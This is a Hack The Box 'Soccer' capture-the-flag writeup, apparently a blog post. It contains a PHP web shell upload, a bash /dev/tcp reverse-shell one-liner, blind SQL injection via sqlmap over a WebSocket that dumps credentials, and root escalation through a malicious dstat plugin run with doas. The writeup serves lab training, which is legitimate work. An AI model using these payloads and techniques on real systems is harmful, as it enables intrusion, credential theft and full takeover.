@@ -1,0 +1,419 @@
+---
+title: Soccer Writeup - Hack The Box
+description: Exploiting file upload and blind SQL injection via WebSocket for initial access, then abusing SUID permissions for privilege escalation
+author: Nontas Bakoulas
+date: 2025-10-15
+category: HTB Machines
+reading_time: 15
+---
+
+## Enumeration
+Let's start with an `nmap` scan:
+```console title="Nmap scan"
+nontas@local:~$ nmap -sVC 10.129.113.142
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-15 10:42 EEST
+Nmap scan report for 10.129.113.142
+Host is up (0.056s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
+|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
+|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
+80/tcp   open  http            nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://soccer.htb/
+9091/tcp open  xmltec-xmlmail?
+| fingerprint-strings:
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|   GetRequest:
+|     HTTP/1.1 404 Not Found
+|     Content-Security-Policy: default-src 'none'
+<SNIP>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 50.00 seconds
+```
+Let's leave port `9091` for now.
+
+The website at port `80` tried to redirect us to `soccer.htb`. Add it to `/etc/hosts`.
+
+Homepage: ![Soccer homepage](/images/blog/soccer/IMG-20251015105417338.png)
+
+There are no clickable links that will redirect us somewhere, so let's start fuzzing:
+```console title="Directory fuzzing"
+nontas@local:~$ ffuf -w /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://soccer.htb/FUZZ -ic
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://soccer.htb/FUZZ
+ :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+tiny                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 92ms]
+:: Progress: [87651/87651] :: Job [1/1] :: 283 req/sec :: Duration: [0:05:06] :: Errors: 0 ::
+```
+
+Only `/tiny` was found, and it displays the login page for `Tiny File Manager`: ![Tiny file manager login](/images/blog/soccer/IMG-20251015105634094.png)
+
+Using the default credentials `admin:admin@123`, we're able to login: ![Tiny file manager interface](/images/blog/soccer/IMG-20251015110422104.png)
+
+The `tiny/` directory has the following contents: ![Tiny directory contents](/images/blog/soccer/IMG-20251015113807672.png)
+The `tinyfilemanager.php` file is the source code of the file manager. 
+
+The `/tiny/uploads/` directory is emtpy: ![Empty uploads directory](/images/blog/soccer/IMG-20251015113859514.png)
+
+### File Upload Attack
+Let's attempt to upload a basic web shell `<?php system($_REQUEST['cmd']); ?>` into the root directory: ![Upload attempt root](/images/blog/soccer/IMG-20251015114247841.png)
+
+I got the following error: 
+![Upload error](/images/blog/soccer/IMG-20251015114228277.png)
+
+Let's re-attempt to upload it at `/tiny/uploads/`: ![Upload to uploads directory](/images/blog/soccer/IMG-20251015114453300.png)
+
+Seems like it uploaded successfully.
+
+Let's attempt to run `id` via the url `/tiny/uploads/shell.php?cmd=id`: ![Web shell test](/images/blog/soccer/IMG-20251015114821728.png)
+
+Since the above worked, I'll now upload [this](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) reverse shell. Visiting `/tiny/uploads/php-reverse-shell.php` I get a connection back:
+```console title="Reverse shell"
+nontas@local:~$ nc -lnvp 1234
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.129.113.142.
+Ncat: Connection from 10.129.113.142:55308.
+Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+ 08:50:52 up  1:12,  0 users,  load average: 0.12, 0.04, 0.01
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Upgrade the shell:
+```console title="Shell upgrade"
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@soccer:/$ ^Z
+[1]  + 27100 suspended  nc -lnvp 1234
+nontas@local:~$ stty raw -echo;fg
+[1]  + 27100 continued  nc -lnvp 1234
+
+www-data@soccer:/$
+```
+
+<Callout title="Alternative reverse shell" type="info">
+If you want to use the `cmd` parameter to trigger a reverse shell, use the following command:
+```bash
+bash -c "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"
+```
+Don't forget to URL Encode it.
+</Callout>
+
+## Foothold
+Let's list the open ports with `netstat`:
+```console title="Port enumeration"
+www-data@soccer:~/html$ netstat -tlnp
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:9091            0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1030/nginx: worker
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      1030/nginx: worker
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+```
+
+There's a `MySQL` service running on ports `3306` and `33060`, the mysterious port `9091`, and `Nginx` at port `80`.
+
+Let's take a look at `sites-enabled`:
+```console
+www-data@soccer:/etc/nginx/sites-enabled$ ls
+default  soc-player.htb
+```
+
+`default` has the following contents:
+```nginx
+server {
+        listen 80;
+        listen [::]:80;
+        server_name 0.0.0.0;
+        return 301 http://soccer.htb$request_uri;
+}
+
+server {
+        listen 80;
+        listen [::]:80;
+
+        server_name soccer.htb;
+
+        root /var/www/html;
+        index index.html tinyfilemanager.php;
+
+        location / {
+               try_files $uri $uri/ =404;
+        }
+
+        location ~ \.php$ {
+                include snippets/fastcgi-php.conf;
+                fastcgi_pass unix:/run/php/php7.4-fpm.sock;
+        }
+
+        location ~ /\.ht {
+                deny all;
+        }
+
+}
+```
+
+First, it sets up a redirect to `soccer.htb`, and then configures the main site.
+
+`soc-player.htb` has the following contents:
+```nginx
+server {
+        listen 80;
+        listen [::]:80;
+
+        server_name soc-player.soccer.htb;
+
+        root /root/app/views;
+
+        location / {
+                proxy_pass http://localhost:3000;
+                proxy_http_version 1.1;
+                proxy_set_header Upgrade $http_upgrade;
+                proxy_set_header Connection 'upgrade';
+                proxy_set_header Host $host;
+                proxy_cache_bypass $http_upgrade;
+        }
+
+}
+```
+
+It set's up another site that matches the name `soc-player.soccer.htb`, so add it to `/etc/hosts`.
+For some reason, the website is hosted at `/root`, which is quite odd.
+
+Let's visit the website: ![Soccer player homepage](/images/blog/soccer/IMG-20251015145308145.png)
+
+It looks identical, except for the fact that there are more options on the navbar.
+
+`/match` shows the following: ![Match page](/images/blog/soccer/IMG-20251015145430711.png)
+
+`/login` shows this login form: ![Login form](/images/blog/soccer/IMG-20251015145528444.png)
+
+and `/signup` allows us to register an account: ![Signup form](/images/blog/soccer/IMG-20251015145559351.png)
+
+I'll register an account and login. It redirected us to `/check`: ![Check page](/images/blog/soccer/IMG-20251015150900913.png)
+
+There's a form where we can submit ticket IDs by pressing Enter.
+
+For a correct ticket ID: ![Valid ticket](/images/blog/soccer/IMG-20251015150952688.png)
+
+And for a wrong ticket ID: ![Invalid ticket](/images/blog/soccer/IMG-20251015151005705.png)
+
+Looking into the HTTP history, we see there's a GET request to `/` at port `9091` with a `101` response, right after we login: ![WebSocket handshake](/images/blog/soccer/IMG-20251015154805305.png)
+
+![WebSocket connection](/images/blog/soccer/IMG-20251015154720953.png)
+
+That means that on port `9091` there's a **websocket server** running.
+
+From Caido, we can see the messages being exchanged via client and server: 
+![WebSocket messages](/images/blog/soccer/IMG-20251015155300578.png)
+
+This is an example message sent to the server:
+![Client message](/images/blog/soccer/IMG-20251015155317996.png)
+
+While this is sent back to the client:
+![Server response](/images/blog/soccer/IMG-20251015155338611.png)
+
+### Blind SQL Injection
+Sending a message like `' or 1=1-- -` doesn't work (gives us `Ticket Doesn't Exist`), since it's probably expecting a number and not a string. By trying the same payload without the `'`, for example `0 or 1=1-- -`, we are successful: ![SQL injection success](/images/blog/soccer/IMG-20251015155812084.png)
+
+This is a classic case of blind SQL injection, and we'll leave the heavy lifting to `SQLMap`. Note that I'm using `--level 5 --risk 3` below since we know it's a blind SQL injection. You might also need to download the python `websocket-client`.
+
+```console title="Install websocket client"
+nontas@local:~$ pip install websocket-client
+<SNIP>
+nontas@local:~$ sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3
+<SNIP>
+sqlmap identified the following injection point(s) with a total of 374 HTTP(s) requests:
+---
+Parameter: JSON id ((custom) POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: {"id": "-7052 OR 6597=6597"}
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: {"id": "1234 AND (SELECT 2023 FROM (SELECT(SLEEP(5)))ysnl)"}
+---
+<SNIP>
+```
+It also found a time-based blind SQL injection.
+
+Let's enumerate the DBs:
+```console title="Database enumeration"
+nontas@local:~$ sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --threads 10 --dbs
+<SNIP>
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] soccer_db
+[*] sys
+<SNIP>
+```
+
+The non-default DB here is `soccer_db`. List the tables inside it:
+```console title="Table enumeration"
+nontas@local:~$ sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --threads 10 -D soccer_db --tables
+<SNIP>
+Database: soccer_db
+[1 table]
++----------+
+| accounts |
++----------+
+<SNIP>
+```
+
+Dump everything inside the `accounts` table:
+```console title="Data extraction"
+nontas@local:~$ sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --threads 10 -D soccer_db -T accounts --dump
+<SNIP>
+Database: soccer_db
+Table: accounts
+[1 entry]
++------+-------------------+----------------------+----------+
+| id   | email             | password             | username |
++------+-------------------+----------------------+----------+
+| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
++------+-------------------+----------------------+----------+
+<SNIP>
+```
+
+### Shell as player
+Back into our reverse shell, we can see that the user `player` exists:
+```console
+www-data@soccer:/$ cat /etc/passwd | grep sh$
+root:x:0:0:root:/root:/bin/bash
+player:x:1001:1001::/home/player:/bin/bash
+```
+
+So just SSH into the server with the credentials `player:PlayerOftheMatch2022`:
+```console title="SSH login"
+nontas@local:~$ ssh player@10.129.113.142                                                                      <SNIP>
+player@10.129.113.142's password:
+<SNIP>
+player@soccer:~$ cat user.txt
+```
+
+And we get the user flag.
+
+## Privilege Escalation via SUID permissions
+Running a script like `LinEnum.sh` on the host, shows the following SUID permissions:
+```txt
+[-] SUID files:
+-rwsr-xr-x 1 root root 42224 Nov 17  2022 /usr/local/bin/doas
+-rwsr-xr-x 1 root root 142792 Nov 28  2022 /usr/lib/snapd/snap-confine
+-rwsr-xr-- 1 root messagebus 51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 473576 Mar 30  2022 /usr/lib/openssh/ssh-keysign
+<SNIP>
+```
+
+<Callout title="Finding SUID files" type="info">
+You can also find SUID files via:
+```console
+player@soccer:~$ find / -perm -4000 2>/dev/null
+```
+</Callout>
+
+`doas` is like `sudo`, but found in OpenBSD operating systems, but it can be installed in other OSes as well.
+
+With a quick search, we find that the configuration file is usually in `/etc/doas`, but it doesn't exist:
+```console
+player@soccer:~$ cat /etc/doas.conf
+cat: /etc/doas.conf: No such file or directory
+```
+
+We can find the `doas.conf` file with `find`:
+```console
+player@soccer:~$ find / -name doas.conf 2>/dev/null
+/usr/local/etc/doas.conf
+```
+
+Let's print the contents inside:
+```console
+player@soccer:~$ cat /usr/local/etc/doas.conf
+permit nopass player as root cmd /usr/bin/dstat
+```
+
+This basically says that `player` can run `dstat` as root.
+
+Looking up the `man` page for `dstat`, we see that it's a tool for generating system resource statistics.
+
+It has the following section:
+> ## Plugins
+While anyone can create their own dstat plugins (and contribute them) dstat ships with a number of plugins already that extend its capabilities greatly.
+
+And on the bottom:
+> ## Files
+Paths that may contain external `dstat_*.py` plugins:
+`~/.dstat/`
+`(path of binary)/plugins/`
+`/usr/share/dstat/`
+`/usr/local/share/dstat/`
+
+The directory at `/usr/local/share/dstat/` exists and is writeable, so let's create a malicious python plugin there.
+
+Create the file `/usr/local/share/dstat/dstat_pwn.py` with the following:
+```python
+import os
+
+os.system("/bin/bash")
+```
+
+You can use this one-liner:
+```console
+player@soccer:~$ echo 'import os; os.system("/bin/bash")' > /usr/local/share/dstat/dstat_pwn.py
+```
+
+To check if the plugin is recognized, use the `--list` flag:
+```console
+player@soccer:~$ doas /usr/bin/dstat --list
+<SNIP>
+/usr/local/share/dstat:
+        pwn
+```
+
+Finally, run it and get the root flag:
+```console title="Privilege escalation"
+player@soccer:~$ doas /usr/bin/dstat --pwn
+/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
+  import imp
+root@soccer:/home/player# cd /root
+root@soccer:~# cat root.txt
+```
+
+We have successfully completed **Soccer**!
